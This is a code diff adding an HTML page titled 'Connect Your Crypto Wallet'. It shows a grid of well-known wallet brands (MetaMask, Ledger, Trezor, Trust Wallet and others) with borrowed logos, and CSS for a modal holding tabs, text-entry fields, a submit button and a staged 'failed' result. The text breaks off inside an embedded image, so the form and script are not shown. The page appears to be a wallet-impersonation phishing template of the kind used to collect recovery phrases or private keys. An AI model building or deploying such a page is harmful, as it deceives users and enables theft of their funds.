@@ -1,0 +1,1039 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect Your Crypto Wallet</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, #0f0f23, #1a1a3a, #2d2d5f);
+            min-height: 100vh;
+            color: #fff;
+            overflow-x: hidden;
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            margin-bottom: 40px;
+            padding: 20px 0;
+        }
+
+        .header h1 {
+            font-size: clamp(2rem, 5vw, 3rem);
+            background: linear-gradient(45deg, #ffd700, #ffed4e, #ffc107);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 15px;
+            text-shadow: 0 0 30px rgba(255, 215, 0, 0.3);
+            font-weight: 700;
+        }
+
+        .header p {
+            font-size: clamp(1rem, 3vw, 1.2rem);
+            color: #b8b8d4;
+            font-weight: 300;
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        .wallet-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(min(280px, 100%), 1fr));
+            gap: 20px;
+            margin-bottom: 40px;
+        }
+
+        .wallet-card {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.1), rgba(255, 215, 0, 0.05));
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            border-radius: 16px;
+            padding: 25px;
+            cursor: pointer;
+            transition: all 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            position: relative;
+            overflow: hidden;
+            backdrop-filter: blur(10px);
+            min-height: 140px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+        }
+
+        .wallet-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 215, 0, 0.1), transparent);
+            transition: left 0.6s;
+        }
+
+        .wallet-card:hover::before,
+        .wallet-card:active::before {
+            left: 100%;
+        }
+
+        .wallet-card:hover,
+        .wallet-card:active {
+            transform: translateY(-4px) scale(1.02);
+            border-color: #ffd700;
+            box-shadow: 0 15px 35px rgba(255, 215, 0, 0.2), 0 0 25px rgba(255, 215, 0, 0.1);
+        }
+
+        .wallet-icon {
+            width: 50px;
+            height: 50px;
+            background: transparent;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 15px;
+            flex-shrink: 0;
+            padding: 8px;
+        }
+
+        .wallet-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 8px;
+        }
+
+        .wallet-name {
+            font-size: clamp(1.1rem, 4vw, 1.4rem);
+            font-weight: 600;
+            color: #ffd700;
+            margin-bottom: 8px;
+            line-height: 1.2;
+        }
+
+        .wallet-description {
+            color: #b8b8d4;
+            font-size: clamp(0.85rem, 3vw, 0.95rem);
+            line-height: 1.4;
+            flex-grow: 1;
+        }
+
+        /* Modal Styles */
+        .modal {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 0;
+            top: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            backdrop-filter: blur(5px);
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .modal-content {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            background: linear-gradient(135deg, #1a1a3a, #2d2d5f);
+            border: 2px solid #ffd700;
+            border-radius: 20px;
+            padding: 30px 25px;
+            text-align: center;
+            width: min(450px, 95vw);
+            max-height: 85vh;
+            overflow-y: auto;
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.5);
+        }
+
+        .close {
+            position: absolute;
+            top: 15px;
+            right: 20px;
+            font-size: 28px;
+            font-weight: bold;
+            color: #ffd700;
+            cursor: pointer;
+            transition: color 0.3s;
+            z-index: 10;
+        }
+
+        .close:hover {
+            color: #ffed4e;
+        }
+
+        .modal-icon {
+            width: 70px;
+            height: 70px;
+            background: transparent;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 20px;
+            padding: 10px;
+            animation: pulse 2s infinite;
+        }
+
+        .modal-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            border-radius: 50%;
+        }
+
+        .modal-title {
+            font-size: clamp(1.4rem, 4vw, 1.8rem);
+            color: #ffd700;
+            margin-bottom: 20px;
+            font-weight: 600;
+            line-height: 1.3;
+        }
+
+        .status-text {
+            font-size: clamp(1rem, 3vw, 1.1rem);
+            color: #b8b8d4;
+            margin-bottom: 30px;
+            line-height: 1.5;
+        }
+
+        /* Tab Styles */
+        .tab-container {
+            display: flex;
+            margin-bottom: 20px;
+            gap: 5px;
+            background: rgba(255, 255, 255, 0.1);
+            padding: 5px;
+            border-radius: 12px;
+        }
+
+        .tab-btn {
+            flex: 1;
+            padding: 12px 8px;
+            background: transparent;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: 600;
+            color: #b8b8d4;
+            transition: all 0.3s ease;
+            font-size: clamp(0.85rem, 3vw, 1rem);
+            white-space: nowrap;
+        }
+
+        .tab-btn:hover {
+            background: rgba(255, 215, 0, 0.1);
+        }
+
+        .tab-btn.active {
+            background: #ffd700;
+            color: #000;
+            box-shadow: 0 2px 8px rgba(255, 215, 0, 0.3);
+        }
+
+        /* Form Styles */
+        .tab-content {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .tab-content label {
+            font-size: clamp(0.85rem, 3vw, 0.9rem);
+            display: block;
+            margin-bottom: 8px;
+            color: #ffd700;
+            font-weight: 500;
+        }
+
+        .tab-content textarea,
+        .tab-content input {
+            width: 100%;
+            padding: 12px 15px;
+            border-radius: 10px;
+            border: 2px solid rgba(255, 215, 0, 0.3);
+            background: rgba(255, 255, 255, 0.05);
+            color: #fff;
+            font-size: clamp(0.9rem, 3vw, 1rem);
+            font-family: inherit;
+            transition: all 0.3s ease;
+        }
+
+        .tab-content textarea:focus,
+        .tab-content input:focus {
+            outline: none;
+            border-color: #ffd700;
+            background: rgba(255, 255, 255, 0.1);
+            box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.1);
+        }
+
+        .tab-content textarea::placeholder,
+        .tab-content input::placeholder {
+            color: #888;
+        }
+
+        #submitIntegration {
+            width: 100%;
+            padding: 15px 20px;
+            background: linear-gradient(45deg, #ffd700, #ffed4e);
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 700;
+            font-size: clamp(1rem, 3vw, 1.1rem);
+            color: #000;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+        }
+
+        #submitIntegration:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(255, 215, 0, 0.4);
+        }
+
+        #submitIntegration:active {
+            transform: translateY(0);
+        }
+
+        /* Loading Animation */
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 3px solid rgba(255, 215, 0, 0.3);
+            border-top: 3px solid #ffd700;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        /* Failed Animation */
+.failed-icon {
+    width: 70px;
+    height: 70px;
+    border-radius: 50%;
+    background: linear-gradient(45deg, #dc3545, #e63946); /* red shades */
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 20px;
+    font-size: 35px;
+    color: white;
+}
+
+.cross {
+    animation: cross 0.6s ease-in-out;
+}
+
+/* Example animation for cross */
+@keyframes cross {
+    0% { transform: scale(0) rotate(45deg); opacity: 0; }
+    50% { transform: scale(1.2) rotate(-10deg); opacity: 1; }
+    100% { transform: scale(1) rotate(0); }
+}
+
+        @keyframes checkmark {
+            0% { transform: scale(0) rotate(0deg); }
+            50% { transform: scale(1.2) rotate(10deg); }
+            100% { transform: scale(1) rotate(-10deg); }
+        }
+
+        /* Mobile-specific optimizations */
+        @media (max-width: 768px) {
+            .container {
+                padding: 15px;
+            }
+            
+            .header {
+                margin-bottom: 30px;
+                padding: 15px 0;
+            }
+            
+            .wallet-grid {
+                grid-template-columns: repeat(auto-fill, minmax(min(250px, 100%), 1fr));
+                gap: 15px;
+            }
+            
+            .wallet-card {
+                padding: 20px;
+                min-height: 130px;
+            }
+            
+            .wallet-icon {
+                width: 45px;
+                height: 45px;
+                margin-bottom: 12px;
+            }
+            
+            .modal-content {
+                padding: 25px 20px;
+                border-radius: 16px;
+            }
+            
+            .close {
+                top: 12px;
+                right: 16px;
+                font-size: 24px;
+            }
+            
+            .tab-btn {
+                padding: 10px 6px;
+                font-size: 0.9rem;
+            }
+            
+            .tab-content textarea,
+            .tab-content input {
+                padding: 10px 12px;
+            }
+            
+            #submitIntegration {
+                padding: 12px 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .container {
+                padding: 10px;
+            }
+            
+            .wallet-grid {
+                grid-template-columns: 1fr;
+                gap: 12px;
+            }
+            
+            .wallet-card {
+                padding: 18px;
+                min-height: 120px;
+            }
+            
+            .wallet-card:hover,
+            .wallet-card:active {
+                transform: translateY(-2px) scale(1.01);
+            }
+            
+            .modal-content {
+                padding: 20px 15px;
+                width: 95vw;
+                max-height: 90vh;
+            }
+            
+            .modal-icon {
+                width: 60px;
+                height: 60px;
+            }
+            
+            .tab-container {
+                margin-bottom: 15px;
+            }
+            
+            .tab-btn {
+                padding: 8px 4px;
+                font-size: 0.85rem;
+            }
+        }
+
+        /* Touch-friendly improvements */
+        @media (hover: none) and (pointer: coarse) {
+            .wallet-card:active {
+                transform: scale(0.98);
+                transition: transform 0.1s;
+            }
+            
+            .tab-btn:active {
+                transform: scale(0.95);
+            }
+            
+            #submitIntegration:active {
+                transform: scale(0.98);
+            }
+        }
+
+        /* High contrast mode support */
+        @media (prefers-contrast: high) {
+            .wallet-card {
+                border-width: 3px;
+            }
+            
+            .modal-content {
+                border-width: 3px;
+            }
+        }
+
+        /* Reduced motion support */
+        @media (prefers-reduced-motion: reduce) {
+            * {
+                animation-duration: 0.01ms !important;
+                animation-iteration-count: 1 !important;
+                transition-duration: 0.01ms !important;
+            }
+            
+            .wallet-card::before {
+                display: none;
+            }
+        }
+
+        /* Dark mode adjustments for better contrast */
+        @media (prefers-color-scheme: dark) {
+            .tab-content textarea,
+            .tab-content input {
+                background: rgba(0, 0, 0, 0.3);
+                border-color: rgba(255, 215, 0, 0.4);
+            }
+        }
+
+        /* Landscape phone orientation */
+        @media (max-height: 500px) and (orientation: landscape) {
+            .header {
+                margin-bottom: 20px;
+                padding: 10px 0;
+            }
+            
+            .modal-content {
+                max-height: 95vh;
+                padding: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Connect Your Wallet</h1>
+            <p>Choose your preferred crypto wallet to get started</p>
+        </div>
+
+        <div class="wallet-grid">
+            <div class="wallet-card" onclick="connectWallet('MetaMask', 'https://th.bing.com/th/id/OIP.vKPbPg_rwB4twGUPOSpk0wHaGw?w=214&h=195&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.vKPbPg_rwB4twGUPOSpk0wHaGw?w=214&h=195&c=7&r=0&o=7&pid=1.7&rm=3" alt="MetaMask" />
+                </div>
+                <div class="wallet-name">MetaMask</div>
+                <div class="wallet-description">Most popular Ethereum wallet with browser extension support</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Best Wallet', 'https://thfvnext.bing.com/th/id/OIP.Z-lXczNfVblYKLaUziR_uwHaD4?w=80&h=80&c=1&bgcl=86ff85&r=0&o=7&cb=thws4&pid=ImgRC&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://thfvnext.bing.com/th/id/OIP.Z-lXczNfVblYKLaUziR_uwHaD4?w=80&h=80&c=1&bgcl=86ff85&r=0&o=7&cb=thws4&pid=ImgRC&rm=3" alt="Coinbase Wallet" />
+                </div>
+                <div class="wallet-name">Best Wallet</div>
+                <div class="wallet-description">Secure wallet by Best Wallet with DeFi support</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Coinbase Wallet', 'https://th.bing.com/th/id/OIP._VY3WoX7aMZuS6s-dnPbxwHaHa?w=163&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP._VY3WoX7aMZuS6s-dnPbxwHaHa?w=163&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="Coinbase Wallet" />
+                </div>
+                <div class="wallet-name">Coinbase Wallet</div>
+                <div class="wallet-description">Secure wallet by Coinbase with DeFi support</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Trust Wallet', 'https://trustwallet.com/assets/images/media/assets/TWT.png')">
+                <div class="wallet-icon">
+                    <img src="https://trustwallet.com/assets/images/media/assets/TWT.png" alt="Trust Wallet" />
+                </div>
+                <div class="wallet-name">Trust Wallet</div>
+                <div class="wallet-description">Multi-cryptocurrency mobile wallet by Binance</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Phantom', 'https://th.bing.com/th?q=Phantom+Wallet+Logo.svg&w=120&h=120&c=1&rs=1&qlt=70&r=0&o=7&cb=1&pid=InlineBlock&rm=3&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th?q=Phantom+Wallet+Logo.svg&w=120&h=120&c=1&rs=1&qlt=70&r=0&o=7&cb=1&pid=InlineBlock&rm=3&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Phantom" />
+                </div>
+                <div class="wallet-name">Phantom</div>
+                <div class="wallet-description">Leading Solana wallet with sleek interface</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('WalletConnect', 'https://th.bing.com/th/id/OIP.zPtx7PqL_QqV5HfyRW6TIwHaFj?w=224&h=180&c=7&r=0&o=7&pid=1.7&rm=3')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.zPtx7PqL_QqV5HfyRW6TIwHaFj?w=224&h=180&c=7&r=0&o=7&pid=1.7&rm=3" alt="WalletConnect" />
+                </div>
+                <div class="wallet-name">WalletConnect</div>
+                <div class="wallet-description">Connect to any wallet via QR code scanning</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Ledger', 'https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo-short.svg')">
+                <div class="wallet-icon">
+                    <img src="https://www.ledger.com/wp-content/themes/ledger-v2/public/images/ledger-logo-short.svg" alt="Ledger" />
+                </div>
+                <div class="wallet-name">Ledger</div>
+                <div class="wallet-description">Hardware wallet for maximum security</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Trezor', 'https://th.bing.com/th/id/OIP.OcC0Jcj1y9MNGMb-3WTEhQHaHa?w=168&h=180&c=7&r=0&o=5&pid=1.7')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.OcC0Jcj1y9MNGMb-3WTEhQHaHa?w=168&h=180&c=7&r=0&o=5&pid=1.7" alt="Trezor" />
+                </div>
+                <div class="wallet-name">Trezor</div>
+                <div class="wallet-description">Pioneer in hardware wallet technology</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Binance Chain', 'https://bin.bnbstatic.com/static/images/common/favicon.ico')">
+                <div class="wallet-icon">
+                    <img src="https://bin.bnbstatic.com/static/images/common/favicon.ico" alt="Binance Chain" />
+                </div>
+                <div class="wallet-name">Binance Chain</div>
+                <div class="wallet-description">Official wallet for Binance Smart Chain</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Rainbow', 'https://th.bing.com/th/id/OIP.s9_kvgDvdDYEcYiEnMpqIwHaHa?w=180&h=194&c=7&r=0&o=5&pid=1.7')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th/id/OIP.s9_kvgDvdDYEcYiEnMpqIwHaHa?w=180&h=194&c=7&r=0&o=5&pid=1.7" alt="Rainbow" />
+                </div>
+                <div class="wallet-name">Rainbow</div>
+                <div class="wallet-description">Beautiful and intuitive Ethereum wallet</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Argent', 'https://th.bing.com/th?q=Argent+Cry+Pto+Wallet+Logo&w=120&h=120&c=1&rs=1&qlt=70&r=0&o=7&cb=1&pid=InlineBlock&rm=3&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247')">
+                <div class="wallet-icon">
+                    <img src="https://th.bing.com/th?q=Argent+Cry+Pto+Wallet+Logo&w=120&h=120&c=1&rs=1&qlt=70&r=0&o=7&cb=1&pid=InlineBlock&rm=3&mkt=en-WW&cc=NG&setlang=en&adlt=moderate&t=1&mw=247" alt="Argent" />
+                </div>
+                <div class="wallet-name">Argent</div>
+                <div class="wallet-description">Smart wallet with social recovery features</div>
+            </div>
+
+            <div class="wallet-card" onclick="connectWallet('Exodus', 'data:image/webp;base64,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')">
+                <div class="wallet-icon">
+                    <img src="data:image/webp;base64,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